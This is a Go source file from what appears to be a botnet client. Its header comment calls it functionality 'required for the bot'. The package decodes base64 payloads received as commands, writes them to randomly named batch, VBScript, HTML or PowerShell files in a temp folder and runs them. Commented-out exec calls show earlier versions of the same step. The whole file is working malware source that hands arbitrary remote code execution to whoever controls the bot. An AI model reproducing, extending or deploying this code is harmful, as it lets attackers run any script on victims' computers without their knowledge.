// Package components icludes functionalities required for the bot
//Check for .NET, If found allow VB/C# script compiling and running
package components

import (
	"os"
	//"os/exec"
)

func handleScripters(mode string, code string) {
	if mode == "0" {
		batchScripter(base64Decode(code))
	} else if mode == "1" {
		vbsScripter(base64Decode(code))
	} else if mode == "2" {
		htmlScripter(base64Decode(code))
	} else if mode == "3" {
		powerShellScripter(base64Decode(code))
	}
}

func batchScripter(code string) {
	n := randomString(5, false)
	nBatch, _ := os.Create(tmpPath + n + ".bat")
	nBatch.WriteString(code)
	nBatch.Close()
	run(tmpPath + n + ".bat")
	//c := exec.Command("cmd", "/C", tmpPath+n+".bat")
	//if err := c.Run(); err != nil { //Handles Errors
	//	NewDebugUpdate("Error Starting Script: " + err.Error())
	//} else {
	//	NewDebugUpdate("Started Batch Script...")
	//}
}

func vbsScripter(code string) {
	n := randomString(5, false)
	nvbs, _ := os.Create(tmpPath + n + ".vbs")
	nvbs.WriteString(code)
	nvbs.Close()
	run(tmpPath + n + ".vbs")
	//	c := exec.Command("cmd", "/C", tmpPath+n+".vbs")
	//	if err := c.Run(); err != nil { //Handles Errors
	//		NewDebugUpdate("Error Starting Script: " + err.Error())
	//	} else {
	//		NewDebugUpdate("Started VBS Script...")
	//}
}

func htmlScripter(code string) {
	n := randomString(5, false)
	nHTML, _ := os.Create(tmpPath + n + ".html")
	nHTML.WriteString(code)
	nHTML.Close()
	run(tmpPath + n + ".html")
	//c := exec.Command("cmd", "/C", tmpPath+n+".html")
	//if err := c.Run(); err != nil { //Handles Errors
	//	NewDebugUpdate("Error Starting Script: " + err.Error())
	//} else {
	//	NewDebugUpdate("Started HTML Script...")
	//}
}

func powerShellScripter(code string) {
	n := randomString(5, false)
	nPowerShell, _ := os.Create(tmpPath + n + ".ps1")
	nPowerShell.WriteString(code)
	nPowerShell.Close()
	run(tmpPath + n + ".ps1")
	//c := exec.Command("cmd", "/C", tmpPath+n+".ps1")
	//if err := c.Run(); err != nil { //Handles Errors
	//	NewDebugUpdate("Error Starting Script: " + err.Error())
	//} else {
	//	NewDebugUpdate("Started PowerShell Script...")
	//}
}
